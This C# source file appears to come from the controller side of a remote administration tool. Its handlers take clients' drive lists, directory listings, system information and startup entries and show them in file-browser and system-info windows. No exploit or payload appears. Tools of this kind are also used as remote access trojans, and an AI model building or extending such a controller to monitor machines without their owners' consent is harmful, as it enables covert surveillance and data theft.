using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;
using xServer.Settings;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleDrivesResponse(Client client, DrivesResponse packet)
        {
            if (client.Value.FrmFm == null)
                return;

            client.Value.FrmFm.AddDrives(packet.Drives);
        }

        public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
        {
            if (client.Value.FrmFm == null)
                return;

            client.Value.FrmFm.ClearFileBrowser();

            new Thread(() =>
            {
                ListViewItem lviBack = new ListViewItem(new string[] { "..", "", "Directory" })
                {
                    Tag = "dir",
                    ImageIndex = 0
                };

                client.Value.FrmFm.AddItemToFileBrowser(lviBack);

                if (packet.Folders.Length != 0)
                {
                    for (int i = 0; i < packet.Folders.Length; i++)
                    {
                        if (packet.Folders[i] != DELIMITER)
                        {
                            ListViewItem lvi = new ListViewItem(new string[] { packet.Folders[i], "", "Directory" })
                            {
                                Tag = "dir",
                                ImageIndex = 1
                            };

                            if (client.Value.FrmFm == null)
                                break;

                            client.Value.FrmFm.AddItemToFileBrowser(lvi);
                        }
                    }
                }

                if (packet.Files.Length != 0)
                {
                    for (int i = 0; i < packet.Files.Length; i++)
                    {
                        if (packet.Files[i] != DELIMITER)
                        {
                            ListViewItem lvi =
                                new ListViewItem(new string[] { packet.Files[i], Helper.Helper.GetDataSize(packet.FilesSize[i]), "File" })
                                {
                                    Tag = "file",
                                    ImageIndex = Helper.Helper.GetFileIcon(Path.GetExtension(packet.Files[i]))
                                };

                            if (client.Value.FrmFm == null)
                                break;

                            client.Value.FrmFm.AddItemToFileBrowser(lvi);
                        }
                    }
                }

                client.Value.LastDirectorySeen = true;
            }).Start();
        }

        public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
        {
            if (XMLSettings.ShowToolTip)
            {
                var builder = new StringBuilder();
                for (int i = 0; i < packet.SystemInfos.Length; i += 2)
                {
                    if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                    {
                        builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
                    }
                }

                FrmMain.Instance.SetToolTipText(client, builder.ToString());
            }

            if (client.Value.FrmSi == null)
                return;

            ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length / 2];
            for (int i = 0, j = 0; i < packet.SystemInfos.Length; i += 2, j++)
            {
                if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                {
                    lviCollection[j] = new ListViewItem(new string[] { packet.SystemInfos[i], packet.SystemInfos[i + 1] });
                }
            }

            if (client.Value.FrmSi != null)
                client.Value.FrmSi.AddItems(lviCollection);
        }

        public static void HandleGetStartupItemsResponse(Client client, GetStartupItemsResponse packet)
        {
            if (client.Value.FrmStm == null)
                return;

            foreach (var pair in packet.StartupItems)
            {
                if (client.Value.FrmStm == null) return;

                var temp = pair.Key.Split(new string[] { "||" }, StringSplitOptions.None);
                var l = new ListViewItem(temp)
                {
                    Group = client.Value.FrmStm.GetGroup(pair.Value),
                    Tag = pair.Value
                };

                if (l.Group == null)
                    return;

                client.Value.FrmStm.AddAutostartItemToListview(l);
            }
        }
    }
}